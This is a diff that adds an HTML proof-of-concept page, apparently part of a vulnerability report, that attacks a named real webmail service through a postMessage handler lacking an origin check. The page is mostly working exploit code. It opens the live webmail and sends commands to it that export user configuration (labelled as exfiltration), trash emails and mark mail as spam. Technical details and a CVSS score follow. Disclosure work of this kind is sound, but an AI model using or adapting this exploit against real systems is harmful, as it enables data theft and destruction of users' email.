@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>BOL Webmail PostMessage PoC - No Origin Check</title>
+<style>
+body { font-family: monospace; background: #1a1a2e; color: #0f0; padding: 20px; }
+h1 { color: #e94560; }
+button { padding: 10px 20px; margin: 5px; background: #16213e; color: #0f0; border: 1px solid #0f0; cursor: pointer; font-family: monospace; }
+button:hover { background: #0f3460; }
+#log { background: #0d1117; padding: 15px; border: 1px solid #333; max-height: 400px; overflow-y: auto; margin-top: 20px; white-space: pre-wrap; }
+.success { color: #0f0; }
+.error { color: #e94560; }
+.info { color: #eee; }
+iframe { border: 1px solid #333; margin-top: 10px; }
+</style>
+</head>
+<body>
+<h1>BOL Webmail - PostMessage Command Injection PoC</h1>
+<p class="info">Vulnerability: window.addEventListener("message", handler) with NO origin check</p>
+<p class="info">45 commands accessible from ANY origin via postMessage</p>
+<hr>
+
+<h3>Step 1: Open target webmail</h3>
+<button onclick="openTarget()">Open bmail.uol.com.br</button>
+<span id="targetStatus"></span>
+
+<h3>Step 2: Send commands (no origin check!)</h3>
+<button onclick="sendCmd('goToPath', {path: '/configuration/webmail/signature'})">Navigate to Settings</button>
+<button onclick="sendCmd('goToPath', {path: '/webmail/0//INBOX/page:1'})">Navigate to Inbox</button>
+<button onclick="sendCmd('goToPath', {path: '/webmail/0//TRASH/page:1'})">Navigate to Trash</button>
+<button onclick="sendCmd('exportConfigsService', {})">Export Configs (exfiltrate)</button>
+
+<h3>Step 3: Destructive actions</h3>
+<button onclick="sendCmd('doTrashEmailsService_emails', {accountId:0, emailIds:['TEST'], collection:[]})">Trash Emails (DoS)</button>
+<button onclick="sendCmd('doSpamEmailsService_emails', {accountId:0, emailIds:['TEST'], senders:[], collection:[]})">Mark as Spam</button>
+
+<div id="log"></div>
+
+<script>
+var targetWin = null;
+
+function log(msg, cls) {
+    var el = document.getElementById('log');
+    var line = document.createElement('div');
+    line.className = cls || 'info';
+    line.textContent = new Date().toISOString().substring(11,19) + ' ' + msg;
+    el.appendChild(line);
+    el.scrollTop = el.scrollHeight;
+}
+
+function openTarget() {
+    targetWin = window.open('https://bmail.uol.com.br/#/webmail/0//INBOX/page:1', 'bolmail');
+    document.getElementById('targetStatus').textContent = targetWin ? ' Window opened!' : ' Popup blocked';
+    log('Opened target window', 'success');
+
+    // Listen for responses (exportConfigsService etc)
+    window.addEventListener('message', function(e) {
+        log('Received message from ' + e.origin + ': ' + JSON.stringify(e.data).substring(0, 500), 'success');
+    });
+}
+
+function sendCmd(cmd, data) {
+    if (!targetWin) { log('Open target first!', 'error'); return; }
+    var payload = Object.assign({cmd: cmd}, data);
+    targetWin.postMessage(payload, '*');
+    log('Sent command: ' + cmd + ' ' + JSON.stringify(data).substring(0, 200), 'success');
+}
+</script>
+
+<hr>
+<h3>Technical Details</h3>
+<pre class="info">
+The BOL Webmail (bmail.uol.com.br) has a postMessage listener:
+
+  window.addEventListener("message", function(a) {
+    var b = window.windowCmds[a.data.cmd];
+    b && b(a);  // NO origin check!
+  }, false);
+
+This accepts commands from ANY origin. 45 commands available including:
+- goToPath: Navigate to arbitrary routes
+- exportConfigsService: Exfiltrate user configuration
+- saveDraftFromPopup: Inject draft emails
+- doTrashEmailsService_emails: Delete emails
+- doSpamEmailsService_emails: Mark as spam
+- doMoveEmailsService_emails: Move emails
+
+All postMessage calls in the app use target origin "*".
+
+CVSS 3.1: AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L = 6.3 (Medium)
+</pre>
+</body>
+</html>
